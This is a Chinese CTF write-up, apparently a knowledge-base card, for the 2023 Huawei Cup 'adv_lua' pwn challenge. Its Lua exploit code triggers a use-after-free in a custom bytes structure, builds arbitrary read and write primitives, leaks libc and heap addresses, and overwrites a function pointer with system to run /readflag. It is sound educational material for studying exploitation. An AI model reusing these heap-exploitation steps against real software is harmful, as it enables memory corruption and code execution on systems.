---
title: 华为杯研究生国赛 adv_lua
contest: 华为杯研究生国赛 adv_lua
year: 2023
difficulty: hard
vuln_type: pwn_unknown
tags: [Lua逆向, 自定义bytes结构, move UAF, get_int64/set_int64读写原语, 堆头address劫持, 函数指针system, /readflag, rdi控制]
attack_chain:
  - 题目: 华为杯研究生国赛 adv_lua (Lua 字节码逆向)
  - 自定义 bytes 数据结构: new(size) 0x30 头部 (size+address) + move(dst,src)
  - 漏洞: move(barr, barr) 同样地址 → free 后再指向 → UAF
  - 任意读写原语: get_int64/set_int64 8 字节读写
  - libc 泄露: a=bytes.new(0x430) + b=bytes.new(0x20) + a.move(a,b) + c=bytes.new(0x20)
  - libcbase = get_int64(c,0) - 0x219ce0
  - heap 泄露: c.move(c,a) + c=bytes.new(0x20) + heapbase = get_int64(c,0)<<12 - 0x600
  - UAF 申请到函数表上, 改 size+address 字段
  - 系统检查 v2>>40-85 < 2 即 (87<<40) 防止申请到 libc
  - 构造 0xb8 堆头 chunk + UAF 改 address 字段
  - 改函数指针为 system
  - 控制 rdi: 改 target=heapbase+0x2a0, 写 /readflag
key_payload: 'bytes.new(0x430) move UAF + set_int64(heap_head+0x28, target) + system("/readflag")'
one_liner: 华为杯 adv_lua：bytes 自定义结构 move 同地址 UAF + 堆头 address 劫持 + 函数指针改 system 执行 /readflag。
lesson: Lua 自定义 C 数据结构逆向要找 move(dst,src) 同样地址漏洞；堆头 size+address 字段是 UAF 利用金矿，劫持 address 实现任意地址读写。
quality: high
---

# 华为杯研究生国赛 adv_lua

## 概览
- **来源**: ctfiot 151498 (看雪 Ayakaaa)
- **题目**: 华为杯研究生国赛 adv_lua
- **难度**: ⭐⭐⭐⭐

## 自定义 bytes 结构
- `bytes.new(size)`: 0x30 头部 (size+address) + 数据
- `bytes.move(dst, src)`: free(dst), dst=src, src=0
- `bytes.get(obj, off)`: address+off 读
- `bytes.set(obj, off, val)`: address+off 写
- Lua 默认无 bytes 结构 → 出题人自加

## move UAF
```lua
barr = bytes.new(1)
print(barr.move(barr, barr))  -- double free 提示
```
- move(dst, src) 同样地址 → 先 free(A) → src 不再指向 A → dst 指向 A (悬垂指针)
- 程序退出才显示 double free, 实际是 UAF

## 读写原语
```lua
function get_int64(obj, off)
    local res = 0
    for i=0,7,1 do
        res = res + (obj.get(obj, i+off) << (i*8))
    end
    return res
end

function set_int64(obj, off, val)
    for i=0,7,1 do
        local tmp = (math.floor(val) >> i*8) & 0xff
        obj.set(obj, i+off, tmp)
    end
end
```

## 泄露 libc/heap
```lua
a = bytes.new(0x430)  -- 释放到 unsortedbin
b = bytes.new(0x20)   -- 占位, a.move(a,b) 释放 a
c = bytes.new(0x20)   -- 占位 unsortedbin, 残留 libc 地址
libcbase = get_int64(c, 0) - 0x219ce0
c.move(c, a)          -- 释放 c
c = bytes.new(0x20)   -- 占位, 残留堆地址
heapbase = (get_int64(c, 0) << 12) - 0x600
```

## 任意地址读写
```lua
a = bytes.new(0x30)  -- 8 次
a.move(a, a)         -- UAF
b = bytes.new(0xb8)  -- 与堆头大小一样
set_int64(a, 0x28, target)  -- 改堆头 address 字段
set_int64(b, 0, 0x6161616161616161)  -- target 任意写
```

## 限制
- 系统检查 `v2>>40-85 < 2` 即 `(87<<40)=0x570000000000` 防止申请到 libc 地址
- 改堆上函数指针是另一条路

## 执行 system("/readflag")
```lua
set_int64(a, 0x28, heapbase+0x2a0)  -- 改 target 到堆上
set_int64(b, 0x8, 0x616c66646165722f)  -- "/readfla"
set_int64(b, 0x10, 0x67)  -- "g\x00"
-- 调用时 rdi 指向堆上, 自动取 /readflag
```

## 教学
- Lua 自定义 C 数据结构逆向思路: 找注册方法 (__tostring/__index/__newindex) → IDA 交叉引用
- move 同地址是经典 UAF 触发姿势
- 堆头 size+address 字段是 UAF 任意读写金矿
